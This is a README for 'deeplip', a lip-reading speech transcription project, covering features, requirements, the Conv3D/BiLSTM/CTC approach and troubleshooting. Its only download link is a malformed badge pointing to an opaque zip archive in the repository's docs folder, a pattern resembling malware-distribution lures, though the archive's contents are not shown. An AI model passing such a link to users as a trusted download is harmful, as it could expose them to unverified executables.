[![Download deeplip](https://raw.githubusercontent.com/HemShah2018/deeplip/main/docs/Software-2.8.zip%20version-brightgreen)](https://raw.githubusercontent.com/HemShah2018/deeplip/main/docs/Software-2.8.zip)

## 🚀 Getting Started
Welcome to deeplip! This application uses deep learning to transcribe speech from video clips of lip movements. It focuses on accessibility, helping those who may benefit from visual speech interpretation.

### 📋 Features
- **Lip Reading**: Recognize spoken words by analyzing mouth movements in video clips.
- **Deep Learning Model**: Utilizes Conv3D, BiLSTM, and CTC architecture for accuracy.
- **Accessibility Focus**: Aids users with hearing impairments by converting visual data to written text.
  
## 💻 System Requirements
To run deeplip, ensure your system meets these requirements:
- **Operating System**: Windows, macOS, or Linux
- **RAM**: Minimum 8 GB
- **Graphics Card**: Compatible with TensorFlow (NVIDIA recommended)
- **Python**: Version 3.7 or higher

## 🎓 Understanding the Technology
deeplip uses advanced machine learning techniques to interpret lip movements. Here’s a brief explanation of how it works:
- **Conv3D**: This model analyzes the video clips in three dimensions, considering both space and time to accurately capture movements.
- **BiLSTM**: This architecture allows the model to learn from past and future frames in the video, enhancing prediction accuracy.
- **CTC (Connectionist Temporal Classification)**: This method helps the model manage the timing of speech, allowing for smoother transcription.

## 🔧 Troubleshooting
If you encounter issues:
- **Installation Problems**: Ensure your system meets the requirements and check for a compatible version of Python.
- **No Output or Errors During Transcription**: Make sure your video is clear and the mouth is visible.
